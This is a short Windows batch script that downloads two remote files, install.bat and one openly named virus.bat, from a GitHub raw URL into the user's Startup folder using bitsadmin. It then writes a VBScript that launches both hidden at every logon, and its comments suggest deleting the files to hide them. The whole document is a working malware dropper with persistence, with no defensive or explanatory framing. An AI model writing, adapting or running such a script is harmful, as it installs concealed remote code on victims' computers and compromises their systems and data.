@echo off
setlocal

:: Define variables
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "installUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/install.bat"
set "virusUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/virus.bat"
set "installPath=%startupFolder%\install.bat"
set "virusPath=%startupFolder%\virus.bat"

:: Download files silently using bitsadmin (built-in Windows tool)
bitsadmin /transfer downloadInstallJob /priority normal "%installUrl%" "%installPath%"
bitsadmin /transfer downloadVirusJob /priority normal "%virusUrl%" "%virusPath%"

:: Create a VBScript file to run both silently at startup
set "vbsPath=%startupFolder%\run_silent.vbs"

(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run Chr(34) ^& "%installPath%" ^& Chr(34), 0, False
echo WshShell.Run Chr(34) ^& "%virusPath%" ^& Chr(34), 0, False
) > "%vbsPath%"

:: Remove batch files if you want to hide them, or keep if needed
:: del "%installPath%"
:: del "%virusPath%"

echo Done. Files downloaded and will run silently at startup.

endlocal
exit /b
